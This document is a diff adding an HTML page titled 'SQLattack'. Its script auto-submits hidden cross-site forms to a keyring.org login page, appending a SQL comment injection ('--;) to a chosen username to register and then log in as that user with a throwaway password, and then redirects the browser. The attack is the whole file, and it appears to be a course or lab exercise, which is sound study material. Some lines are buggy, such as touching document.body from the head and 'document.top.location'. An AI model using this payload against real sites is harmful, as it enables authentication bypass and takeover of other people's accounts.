@@ -1,0 +1,81 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>SQLattack</title>
+<script type="text/javascript">
+	var url = "http://keyring.org/index.php";
+	var s = "hacked";
+	var iframe = document.createElement("iframe");
+	document.body.appendChild(iframe);
+	iframe.style.display = "block";
+	iframe.contentWindow.name = s;
+function attack(username, trigger){
+	//document.write("HI");
+	var form = document.createElement("form");
+	form.target = s;
+	form.action = url;
+	form.method = "POST";
+
+
+	var uname = document.createElement("input");
+	uname.type = "hidden";
+	uname.name = "login_username";
+	uname.value = username;
+	form.appendChild(uname);
+
+	var pword = document.createElement("input");
+	pword.type = "hidden";
+	pword.name = "login_password";
+	pword.value = "blah";
+	form.appendChild(pword);
+
+	if(!trigger){
+		var register = document.createElement("input");;
+		register.type = "hidden";
+		register.name = "submit_registration";
+		register.value = "Register";
+		form.appendChild(register);
+	}
+	else{
+		var submit = document.createElement("input");
+		submit.type = "hidden";
+		submit.name = "submit_login";
+		submit.value = "Log in";
+		form.appendChild(submit);
+	}
+	
+	document.body.appendChild(form);
+	form.submit();
+}
+function register(username){
+	var original = username;
+	var inject = "'--;";
+	var trigger = false;
+	username = username + inject;
+	attack(username, trigger);
+	login(original);
+}
+function login(username){
+	var inject = "'--;";
+	var trigger = true;
+	username = username + inject;
+	attack(username, trigger);
+}
+function doit(username){
+	register(username);
+	finish();
+}
+function finish(){
+	document.top.location="http://keyring.org/index.php";
+}
+
+</script>
+</head>
+<body>
+	<form method="POST">
+		<input type="text" name="namebox" id="one"/>
+		<input type="button" onclick="doit(document.getElementById('one').value)" value="Login"/>
+	</form>
+</body>
+</html>
